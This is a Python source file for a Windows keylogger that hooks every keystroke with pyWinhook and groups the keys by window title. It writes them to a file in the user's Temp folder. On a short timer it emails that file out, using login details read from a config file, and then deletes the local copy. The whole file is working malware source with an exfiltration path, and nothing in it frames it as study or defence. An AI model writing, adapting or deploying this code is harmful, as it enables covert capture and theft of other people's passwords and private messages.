import configparser
import os
import time
from getpass import getuser
from threading import Thread

import pythoncom
import pyWinhook as pyHook

from utils import send_mail


class KeyLogger:

    USER_NAME = getuser()
    APP_DIR = f'C:/Users/{USER_NAME}/AppData/Local/Temp'

    def __init__(self,log_method=1,log_file='keylog.txt',debug=False,time_interval=1):
        self.key_strokes = ""
        self.log_file = os.path.join(KeyLogger.APP_DIR,log_file)
        if os.path.exists(self.log_file):
            os.remove(self.log_file)
        self.timer = Thread(target=self.schedule_log,args=())
        self.timer.daemon = True
        self.time_interval = time_interval * 60
        self.keylog_data = []
        if log_method == 1:
            self.log_method = self.log_to_file
        elif log_method == 2:
            self.log_method = self.email_log
        elif log_method == 3:
            self.log_method = self.tweet_log

    def schedule_log(self):
        while True:
            time.sleep(self.time_interval)
            self.log()

    def repr_keystroke(self,event):
        if event.Ascii in range(32,127):
            return chr(event.Ascii)
        else:
            return f' [{event.Key}] '

    def ListenKeyboard(self,event):
        if event.Key == 'Escape':
            print("Writing logs and quitting...")
            self.log()
            exit(0)
        if event.MessageName == 'key down':
            self.keylog_data.append(event)
            if event.Ascii in range(32,127):
                self.key_strokes += chr(event.Ascii)
            else:
                self.key_strokes += f' [{event.Key}] '

        return True

    def run(self):
 
        hm = pyHook.HookManager()
        hm.KeyAll = self.ListenKeyboard
        hm.HookKeyboard()

        self.timer.start()

        print("Keylogger started.") # logging
        pythoncom.PumpMessages()

    def log(self,event=None):
        if not self.keylog_data:
            return 
        try:
            self.log_method(event=event)
            self.keylog_data = []
            self.key_strokes = ""
        except Exception as e:
            print('Error occured: ',e) # logging
            print("Clearing log data...")
            self.keylog_data = []

    def log_to_file(self,event=None,*args,**kwargs):
        log_info = {}
        for event in self.keylog_data:
            key_stroke = self.repr_keystroke(event)
            if not event.WindowName in log_info:
                log_info[f'{event.WindowName}'] = key_stroke
            else:
                log_info[f'{event.WindowName}'] += key_stroke
        with open(self.log_file,'a+') as f:
            f.write(time.strftime("%c\n"))
            for keys in log_info:
                f.write(f'Window Name: [{keys}]\n\t{log_info[keys]}\n')
            f.write('*'*30+'\n\n')

    def tweet_log(self,*args,**kwargs):
        print("Tweeting keylogs: ",self.key_strokes)

    def email_log(self,login_cred=None,*args,**kwargs):
        email = None
        password = None
        print("Sending email logs...")
        self.log_to_file()
        if login_cred is None:
            if os.path.exists(os.path.join(KeyLogger.APP_DIR,'email.cfg')):
                config = configparser.ConfigParser()
                config.read('email.cfg')
                email = config['LOGIN_CRED']['EMAIL']
                password = config['LOGIN_CRED']['PASSWORD']
        else:
            email, password = login_cred
        send_mail(email,email,time.strftime('Keylogs for %c'),self.key_strokes,files=[self.log_file],creds=(email,password))
        print('Email sent!')
        os.remove(self.log_file)

if __name__ == "__main__":
    keylogger = KeyLogger(log_method=2,time_interval=0.1)
    keylogger.run()